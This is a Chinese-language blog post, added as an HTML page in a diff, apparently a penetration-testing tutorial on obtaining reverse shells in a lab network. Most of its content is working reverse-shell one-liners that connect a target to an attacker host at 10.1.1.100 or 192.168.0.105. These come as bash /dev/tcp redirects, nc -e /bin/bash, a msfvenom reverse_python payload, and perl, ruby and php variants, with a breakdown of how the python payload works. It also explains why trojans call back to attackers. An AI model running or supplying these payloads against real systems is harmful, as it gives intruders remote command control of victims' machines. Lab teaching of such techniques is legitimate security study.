@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>内网渗透篇反弹shell的N种姿势 | 开发者问答集锦</title>
+    <meta property="og:title" content="内网渗透篇反弹shell的N种姿势 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="内网渗透篇反弹shell的N种姿势">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87%E5%8F%8D%E5%BC%B9shell%E7%9A%84n%E7%A7%8D%E5%A7%BF%E5%8A%BF/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">内网渗透篇反弹shell的N种姿势</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<hr />
+
+<p>当你的才华</p>
+
+<p>还撑不起你的野心时</p>
+
+<p>那你就应该静下心来学习</p>
+
+<hr />
+
+<p><strong>目录</strong></p>
+
+<p>反弹shell的N种姿势</p>
+
+<p>0x01 前言</p>
+
+<p>反弹shell 是啥？</p>
+
+<p>反弹shell 的前因后果</p>
+
+<p>0x02 本次环境网络拓扑图</p>
+
+<p>0x03 bash直接反弹</p>
+
+<p>介绍</p>
+
+<p>0x04 利用nc</p>
+
+<p>0x05 利用msfvenom</p>
+
+<p>具体语言实现</p>
+
+<p>0x06 分析下这段脚本的内容</p>
+
+<hr />
+
+<p>参考链接：</p>
+
+<p>反弹shell各种姿势的备忘录</p>
+
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+
+<h1 id="反弹shell的n种姿势">反弹shell的N种姿势</h1>
+
+<h2 id="0x01-前言">0x01 前言</h2>
+
+<h3 id="反弹shell-是啥">反弹shell 是啥？</h3>
+
+<p>反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
+
+<p><strong>reverse shell</strong> 与 <strong>telnet，ssh等标准shell</strong> 对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+
+<h3 id="反弹shell-的前因后果">反弹shell 的前因后果</h3>
+
+<p>通常用于被控端因 <strong>防火墙受限、权限不足、端口</strong> 被占用等情形</p>
+
+<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（ <strong>目标ip：目标机器端口</strong> ），这是比较常规的形式，我们叫做
+<strong>正向连接</strong> 。</p>
+
+<p><strong>远程桌面，web服务，ssh，telnet</strong> 等等，都是正向连接。</p>
+
+<p><strong>那么什么情况下正向连接不太好用了呢？</strong></p>
+
+<blockquote>
+<p>1）某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+
+<p>2）它的ip会动态改变，你不能持续控制。</p>
+
+<p>3）由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+
+<p>4）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
+</blockquote>
+
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+
+<p>反弹shell是外网渗透的最后一步，也是内网渗透的第一步，本篇幅重点在于针对反弹shell常见下的功能实现以及原理理解。</p>
+
+<h2 id="0x02-本次环境网络拓扑图">0x02 本次环境网络拓扑图</h2>
+
+<p><a href="https://img.it610.com/image/info8/75f130089ecc4ac9a3aaad319622920c.jpg"><img src="https://img.it610.com/image/info8/75f130089ecc4ac9a3aaad319622920c.jpg" alt="内网渗透篇：反弹shell的N种姿势_第1张图片" /></a></p>
+
+<h2 id="0x03-bash直接反弹"><strong>0x03 bash直接反弹</strong></h2>
+
+<h3 id="介绍">介绍</h3>
+
+<blockquote>
+<p>1. Bash –I 即产生一个bash交互环境</p>
+
+<p>2. &gt;&amp;</p>
+
+<p>1）当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件</p>
+
+<p>2）当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</p>
+
+<p>3. /dev/tcp/10.1.1.<sup>100</sup>&frasl;<sub>123</sub>
+让主机B与主机A（10.1.1.100）进行tcp连接，端口为123（注：linux下所有内容都以文件形式组织存在，所以看到/dev/tcp不用感到奇怪，它是Linux中的一个特殊设备,打开这个文件就相当于进行了一个socket调用，建立一个socket连接）</p>
+
+<blockquote>
+<p>&amp; 后面接
+/dev/tcp/ip/port，根据3的注释和2的注释1)部分可知，意思为将标准输出和标准错误输出重定向到这个文件，重定向到socket连接的远程主机A上，此时如果主机A正在监听相应的端口，就会收到主机B的bash的标准输出和标准错误输出</p>
+</blockquote>
+
+<p>4. 0&gt;&amp;1
+将标准输入重定向到标准输出，而标准输出在之前已经重定向到主机A了，添加这一部分是因为如果没有这一部分，在主机A上只能接收输出，而无法输入，或者说无法交互，添加上这一部分后，在主机A看来，就相当于拿到了主机B的shell</p>
+
+<p><strong>注：</strong> 0 - stdin 代表标准输入,使用</p>
+
+<p>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</p>
+
+<p>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</p>
+</blockquote>
+
+<p><strong>根据介绍里面讲的内容，我们这里使用三种方式来bash 反弹shell</strong></p>
+
+<p><strong>第一种方式：</strong></p>
+
+<p>1. 在攻击机上，使用nc监听</p>
+
+<pre><code>nc -lvvp 123
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/cec50ab47f984f3baab32ccb36a25db1.jpg"><img src="https://img.it610.com/image/info8/cec50ab47f984f3baab32ccb36a25db1.jpg" alt="内网渗透篇：反弹shell的N种姿势_第2张图片" /></a></p>
+
+<p>2. 在靶场机上，使用bash直接反弹</p>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.1.1.100/123 0&gt;&amp;1
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/6c03d6a727f34d37af97ff937a9604af.jpg"><img src="https://img.it610.com/image/info8/6c03d6a727f34d37af97ff937a9604af.jpg" alt="内网渗透篇：反弹shell的N种姿势_第3张图片" /></a></p>
+
+<p>3. 此时，攻击机上收到shell</p>
+
+<p><a href="https://img.it610.com/image/info8/8bd46f4b00074b7eb791aade10aae2a5.jpg"><img src="https://img.it610.com/image/info8/8bd46f4b00074b7eb791aade10aae2a5.jpg" alt="内网渗透篇：反弹shell的N种姿势_第4张图片" /></a></p>
+
+<p><strong>第二种方式</strong></p>
+
+<p><strong>• 将0 &gt;&amp;1修改为0&gt;&amp;2</strong></p>
+
+<p>1. 同样现在在攻击机上开启监听</p>
+
+<pre><code>nc -lvvp 123
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/f39bd59c79614817ab0143dd5e04d2aa.jpg"><img src="https://img.it610.com/image/info8/f39bd59c79614817ab0143dd5e04d2aa.jpg" alt="内网渗透篇：反弹shell的N种姿势_第5张图片" /></a></p>
+
+<p>2. 靶场机修改后执行如下命令</p>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.1.1.100/123 0&gt;&amp;2
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/9006f527498e4883a69c80b8053aedaf.jpg"><img src="https://img.it610.com/image/info8/9006f527498e4883a69c80b8053aedaf.jpg" alt="" /></a></p>
+
+<p>实现第一种方式同样的效果</p>
+
+<p><a href="https://img.it610.com/image/info8/78d5ce8cac6f4c10b174b11c1035268b.jpg"><img src="https://img.it610.com/image/info8/78d5ce8cac6f4c10b174b11c1035268b.jpg" alt="内网渗透篇：反弹shell的N种姿势_第6张图片" /></a></p>
+
+<p><strong>第三种方式</strong></p>
+
+<p><strong>• 不添加 0 &gt;&amp;2</strong></p>
+
+<p>1. 攻击机连接上开启监听</p>
+
+<pre><code>nc -lvvp 123
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/d7c5523da151445a93c0afa0442d1bf7.jpg"><img src="https://img.it610.com/image/info8/d7c5523da151445a93c0afa0442d1bf7.jpg" alt="" /></a></p>
+
+<p>2. 靶场机修改后运行如下命令</p>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.1.1.100/123
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/15c2b4cc9d964455bee6ed8a36234518.jpg"><img src="https://img.it610.com/image/info8/15c2b4cc9d964455bee6ed8a36234518.jpg" alt="内网渗透篇：反弹shell的N种姿势_第7张图片" /></a></p>
+
+<p>3. 攻击机同样建立了连接，但是输入命令是没有任何响应</p>
+
+<p><a href="https://img.it610.com/image/info8/4c98401742834318bf86256ce5754575.jpg"><img src="https://img.it610.com/image/info8/4c98401742834318bf86256ce5754575.jpg" alt="" /></a></p>
+
+<p>4. 但在靶场机中输入命令时，靶场机没有回显，却回显出现在攻击机上，命令执行后的回显也是在攻击机上</p>
+
+<p><a href="https://img.it610.com/image/info8/7b7c471009c949c2aad0a036ca8a53d0.jpg"><img src="https://img.it610.com/image/info8/7b7c471009c949c2aad0a036ca8a53d0.jpg" alt="内网渗透篇：反弹shell的N种姿势_第8张图片" /></a></p>
+
+<h2 id="0x04-利用nc"><strong>0x04 利用nc</strong></h2>
+
+<p>1. 攻击机开启监听</p>
+
+<pre><code>nc -lvvp 1234
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/096ec56ee24c40ca86ad0e6b2d780c23.jpg"><img src="https://img.it610.com/image/info8/096ec56ee24c40ca86ad0e6b2d780c23.jpg" alt="" /></a></p>
+
+<p>2. 使用nc命令直接建立一个tcp 1234 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机。</p>
+
+<pre><code>nc 10.1.1.100 1234 -t -e /bin/bash
+
+# 主机会B反弹一句话的信息
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/7ae95f4ff85d4c4bb3f3f6fc2d344181.jpg"><img src="https://img.it610.com/image/info8/7ae95f4ff85d4c4bb3f3f6fc2d344181.jpg" alt="" /></a></p>
+
+<p>成功反弹</p>
+
+<p><a href="https://img.it610.com/image/info8/c3bbe80e681741faa5fe756af7c21334.jpg"><img src="https://img.it610.com/image/info8/c3bbe80e681741faa5fe756af7c21334.jpg" alt="内网渗透篇：反弹shell的N种姿势_第9张图片" /></a></p>
+
+<h3 id="0x05-利用msfvenom"><strong>0x05 利用msfvenom</strong></h3>
+
+<p>1. 在上使用msfvenom –l进行搜索相关payload</p>
+
+<p><a href="https://img.it610.com/image/info8/c34e706242c24de8b7158b6a10eac19c.jpg"><img src="https://img.it610.com/image/info8/c34e706242c24de8b7158b6a10eac19c.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/09fb5992b0214c79bf702f5115f2b5dc.jpg"><img src="https://img.it610.com/image/info8/09fb5992b0214c79bf702f5115f2b5dc.jpg" alt="内网渗透篇：反弹shell的N种姿势_第10张图片" /></a></p>
+
+<p>2. 关键字进行过滤，优化搜索结果</p>
+
+<p>反弹shell相关的payload，所以关键字为&rsquo;cmd/unix/reverse&rsquo;,配合grep进行匹配即可</p>
+
+<p>则输入如下命令</p>
+
+<pre><code>msfvenom -l payloads | grep 'cmd/unix/reverse'
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/4c69964e73314a069e10b51b9afb38d9.jpg"><img src="https://img.it610.com/image/info8/4c69964e73314a069e10b51b9afb38d9.jpg" alt="内网渗透篇：反弹shell的N种姿势_第11张图片" /></a></p>
+
+<p>3. 从结果中可以看到有许多实现的方式，包括lua、nodej、perl等，为什么会有这么多方式呢?</p>
+
+<p><strong>这是为了适应不同靶机的需求，可能目标靶机上只有perl的执行环境，那么就可以使用perl实现的反弹shell的payload，如果靶机上只有python的环境，那么就使用python实现的payload，此处以python为例。选定payload后，设置后本机的ip和监听的端口</strong></p>
+
+<p>输入以下命令</p>
+
+<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=10.1.1.100 LPORT=1234
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/9cad1e403221450081491a548eabdb6a.jpg"><img src="https://img.it610.com/image/info8/9cad1e403221450081491a548eabdb6a.jpg" alt="内网渗透篇：反弹shell的N种姿势_第12张图片" /></a></p>
+
+<p>执行后的结果</p>
+
+<p><a href="https://img.it610.com/image/info8/52a30a99749142f2bbf30436be386837.jpg"><img src="https://img.it610.com/image/info8/52a30a99749142f2bbf30436be386837.jpg" alt="内网渗透篇：反弹shell的N种姿势_第13张图片" /></a></p>
+
+<p>4. 攻击机上启动nc进行监听</p>
+
+<p><a href="https://img.it610.com/image/info8/d6027dada2614193b97fc878adc40cad.jpg"><img src="https://img.it610.com/image/info8/d6027dada2614193b97fc878adc40cad.jpg" alt="" /></a></p>
+
+<p>5. 切换到靶场机，在终端输入msfvenom给出的payload</p>
+
+<p><a href="https://img.it610.com/image/info8/665fbc61d856415080b27f5066a5a4e4.jpg"><img src="https://img.it610.com/image/info8/665fbc61d856415080b27f5066a5a4e4.jpg" alt="内网渗透篇：反弹shell的N种姿势_第14张图片" /></a></p>
+
+<p>回车执行，即可在主机A上收到反弹的shell</p>
+
+<p><a href="https://img.it610.com/image/info8/cd3b904eecfd46bb9847c3fd84893bab.jpg"><img src="https://img.it610.com/image/info8/cd3b904eecfd46bb9847c3fd84893bab.jpg" alt="内网渗透篇：反弹shell的N种姿势_第15张图片" /></a></p>
+
+<p>6. payload解码后就是python的一段脚本</p>
+
+<p><a href="https://img.it610.com/image/info8/663965fc1f1245caaafaadef608195ae.jpg"><img src="https://img.it610.com/image/info8/663965fc1f1245caaafaadef608195ae.jpg" alt="内网渗透篇：反弹shell的N种姿势_第16张图片" /></a></p>
+
+<h3 id="具体语言实现"><strong>具体语言实现</strong></h3>
+
+<p>先看python的</p>
+
+<p>还是现在主机A上监听,命令nc -lvvp 1234</p>
+
+<p><a href="https://img.it610.com/image/info8/3e6a514c2bdf4ba5a435b35d55d683ca.jpg"><img src="https://img.it610.com/image/info8/3e6a514c2bdf4ba5a435b35d55d683ca.jpg" alt="" /></a></p>
+
+<p>将之前生成python的，在主机B上执行python，命令python -c xxxxx</p>
+
+<p><a href="https://img.it610.com/image/info8/8885ea2d8b814302a22ec5dca34fc76c.jpg"><img src="https://img.it610.com/image/info8/8885ea2d8b814302a22ec5dca34fc76c.jpg" alt="内网渗透篇：反弹shell的N种姿势_第17张图片" /></a></p>
+
+<p>此时在主机A上就收到反弹shell了</p>
+
+<h2 id="0x06-分析下这段脚本的内容">0x06 分析下这段脚本的内容</h2>
+
+<blockquote>
+<p>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lsquo;192.168.0.105&rsquo;,123))
+建立socket连接</p>
+
+<p>os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+使用了os模块的dup2函数和socket模块的fileno函数</p>
+
+<p>fileno函数：返回套接字的文件描述符fd，如果从shell中运行一个进程，默认会有3个文件描述符存在(0、１、2),
+0与进程的标准输入相关联，１与进程的标准输出相关联，2与进程的标准错误输出相关联。</p>
+
+<p>Dup2函数：dup2传入两个文件描述符，f1和f2（f1是必须存在的），如果f2存在，就关闭f2，然后将f1代表的那个文件强行复制给f2，f2这个文件描述符不会发生变化，但是fd2指向的文件就变成了f1指向的文件。这个函数最大的作用是重定向</p>
+
+<p>这句的代码的作用就是将fd2指向s.fileno(),而fileno（）返回的是建立socket连接返回的文件描述符fd，也就是将将标准输入、标准输出、标准错误输出重定向到远程</p>
+
+<p>p=subprocess.call([&lsquo;/bin/bash&rsquo;,&lsquo;-i&rsquo;])
+使用subprocess在本地开启子进程，同时传入“i“使得bash以交互模式启动</p>
+
+<p>经过以上代码的功能整合，在主机A就相当于接收到了主机B的shell</p>
+
+<p>其他语言的实现也是同样的道理，关键的点都在于建立socket连接以及之后的交互实现</p>
+</blockquote>
+
+<p><strong>1）perl语言的</strong></p>
+
+<pre><code>perl -e 'use Socket;$i=&quot;192.168.0.105&quot;;$p=123;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/7026d5f52b444c9a92cd6c4033c09713.jpg"><img src="https://img.it610.com/image/info8/7026d5f52b444c9a92cd6c4033c09713.jpg" alt="" /></a></p>
+
+<p><strong>2）ruby语言的</strong></p>
+
+<pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;192.168.0.105&quot;,&quot;123&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/0e7a228b46d343b5a7b32e181d1a10e2.jpg"><img src="https://img.it610.com/image/info8/0e7a228b46d343b5a7b32e181d1a10e2.jpg" alt="" /></a></p>
+
+<p><strong>3）php语言</strong></p>
+
+<p>最简单的是利用php的exec函数直接执行第一部分的那条bash反弹的命令，不过更常见的是这条命令</p>
+
+<pre><code>php -r '$sock=fsockopen(&quot;192.168.0.5&quot;,123);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<p>3代表fsockopen函数建立socket连接后返回的文件描述符，在exec函数中进行重定向，其中的0，1，2分别是前面提到的标准输入、标准输出、标准错误输出。原理与前面分析的一致。</p>
+
+<p><a href="https://img.it610.com/image/info8/960a41ea00ee4b199be1ace1c7a081c0.jpg"><img src="https://img.it610.com/image/info8/960a41ea00ee4b199be1ace1c7a081c0.jpg" alt="" /></a></p>
+
+<p>参考链接：</p>
+
+<p><a href="http://www.hetianlab.com/expc.do?ce=9995392d-3d8d-4eb1-9c10-504ce69ed276">http://www.hetianlab.com/expc.do?ce=9995392d-3d8d-4eb1-9c10-504ce69ed276</a></p>
+
+<hr />
+
+<p>我不需要自由，只想背着她的梦</p>
+
+<p>一步步向前走，她给的永远不重</p>
+
+<hr />
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
